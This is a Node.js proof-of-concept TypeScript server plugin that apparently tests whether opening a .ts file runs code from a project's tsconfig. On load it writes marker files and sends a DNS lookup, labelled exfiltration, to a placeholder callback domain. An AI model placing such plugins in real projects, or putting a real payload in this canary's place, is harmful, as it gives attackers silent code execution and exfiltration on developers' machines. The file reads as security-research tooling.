#!/usr/bin/env node
'use strict';

/**
 * PING TEST — Minimal TSServer Plugin
 * ====================================
 *
 * THE CANARY: If this fires, the plugin loaded.
 *            If this doesn't fire, TSServer never loaded the plugin.
 *
 * Only 3 real operations:
 *   1. Synchronous filesystem marker (no deps)
 *   2. DNS lookup to OAStify/Interactsh (async, requires dns module)
 *   3. TSServer plugin interface (minimal, no crash)
 *
 * Replace CHANGEME.oastify.com with your actual callback domain.
 *
 * USAGE:
 *   1. Deploy this as the plugin file
 *   2. Configure tsconfig.json to load it
 *   3. Open any .ts file
 *   4. Check /tmp/ping-test-executed (existence = plugin loaded)
 *   5. Check OAStify/Interactsh DNS logs for PINGTEST lookup
 */

var CALLBACK = 'CHANGEME.oastify.com';  // <-- REPLACE THIS

// --- OPERATION 1: Synchronous filesystem marker ---
// If this file exists after opening a .ts file, the plugin was require()d.
try {
    var ts = new Date().toISOString().replace(/:/g, '-');
    require('fs').writeFileSync('/tmp/ping-test-executed',
        'PING_TEST_OK|' + ts + '|pid=' + process.pid + '\n');
} catch (_) { /* /tmp may not be writable */ }

// --- OPERATION 2: DNS lookup exfiltration ---
// This sends a DNS query to the authoritative nameserver of CALLBACK.
// The query WILL appear in OAStify/Interactsh logs as a DNS interaction.
if (CALLBACK.indexOf('CHANGEME') === -1) {
    try {
        require('dns').lookup('PINGTEST.' + CALLBACK, function() {});
    } catch (_) { /* dns module not available */ }
}

// --- OPERATION 3: TSServer plugin interface ---
// Minimal shim — must return a valid plugin or TSServer crashes.
function init(modules) {
    // Secondary trigger: also write marker on init()
    try {
        require('fs').appendFileSync('/tmp/ping-test-init-called',
            new Date().toISOString() + '|INIT_CALLED\n');
    } catch (_) {}

    return {
        create: function(info) { return info.languageService; },
        getExternalFiles: function() { return []; },
        onConfigurationChanged: function() {},
    };
}

module.exports = init;
module.exports.typescriptServerPlugin = true;
